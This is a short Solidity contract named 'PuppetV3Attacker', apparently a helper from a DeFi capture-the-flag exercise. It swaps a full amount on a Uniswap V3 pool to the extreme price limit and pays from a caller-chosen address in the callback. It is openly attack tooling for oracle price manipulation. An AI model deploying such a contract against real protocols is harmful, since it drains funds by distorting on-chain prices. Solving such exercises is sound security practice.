// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV3Pool} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import {TickMath} from "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice Exact-input swap on a V3 pool; pays owed tokens from `payer` in callback.
contract PuppetV3Attacker {
    IUniswapV3Pool private immutable pool;
    IERC20 private immutable token0;
    IERC20 private immutable token1;

    constructor(IUniswapV3Pool _pool, IERC20 _token0, IERC20 _token1) {
        pool = _pool;
        token0 = _token0;
        token1 = _token1;
    }

    /// @param tokenIn Must be the pool's token0 or token1.
    function swapExact(address recipient, IERC20 tokenIn, uint256 amountIn) external {
        bool zeroForOne = address(tokenIn) == address(token0);
        require(address(tokenIn) == address(token0) || address(tokenIn) == address(token1), "tokenIn not in pool");
        uint160 sqrtPriceLimitX96 =
            zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1;
        pool.swap(recipient, zeroForOne, int256(amountIn), sqrtPriceLimitX96, abi.encode(recipient));
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        require(msg.sender == address(pool));
        address payer = abi.decode(data, (address));
        if (amount0Delta > 0) {
            token0.transferFrom(payer, msg.sender, uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            token1.transferFrom(payer, msg.sender, uint256(amount1Delta));
        }
    }
}
